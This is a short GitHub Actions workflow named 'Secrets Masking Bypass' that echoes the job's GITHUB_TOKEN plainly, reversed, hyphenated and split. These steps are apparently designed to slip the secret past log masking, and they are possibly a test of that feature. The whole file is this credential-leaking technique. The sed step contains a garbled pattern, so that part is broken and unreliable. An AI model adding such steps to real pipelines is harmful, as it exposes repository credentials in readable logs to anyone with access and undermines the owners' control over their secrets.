name: Secrets Masking Bypass

on:
  workflow_dispatch:

jobs:
  masking-bypass:
    runs-on: ubuntu-latest

    permissions:
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Test GITHUB_TOKEN
        env:
          TOKEN: ${{ github.token }}
        run: |
          echo "=== GITHUB_TOKEN original ==="
          echo "$TOKEN"

          echo "=== GITHUB_TOKEN rev ==="
          echo "$TOKEN" | rev

          echo "=== GITHUB_TOKEN hyphen ==="
          echo "$TOKEN" | sed 's/$begin:math:text$\.\.$end:math:text$/\1-/g'

          echo "=== GITHUB_TOKEN split ==="
          printf "%s" "${TOKEN:0:8}"
          printf "%s\n" "${TOKEN:8}"